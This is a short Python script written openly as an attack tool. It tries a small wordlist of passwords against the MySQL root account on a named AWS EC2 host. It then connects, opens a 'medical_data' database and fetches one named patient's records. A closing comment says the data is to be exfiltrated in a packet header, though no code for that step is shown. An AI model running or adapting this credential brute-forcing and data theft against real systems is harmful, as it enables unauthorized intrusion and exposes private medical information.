import mysql.connector as mysql

# Crack password

# function that checks if pw is correct
def connect(pw):
    try:
        db = mysql.connect(
            host = "ec2-54-161-19-249.compute-1.amazonaws.com",
            user = "root",
            passwd = pw
        )
        return("success")
    except:
        return("wrong")

# we need a good wordlist...
wordlist=["password321", "Password!123"]

for word in wordlist:
    print(word)
    if connect(word)=='success':
        print("password is", word)
        pw = word

# Get data
db = mysql.connect(
    host = "ec2-54-161-19-249.compute-1.amazonaws.com",
    user = "root",
    passwd = pw
)

cursor = db.cursor()

cursor.execute("use medical_data;")

cursor.execute("select * from patients where name = 'Our Guy';")
result = cursor.fetchall()

# Exfiltrate data in a packet header
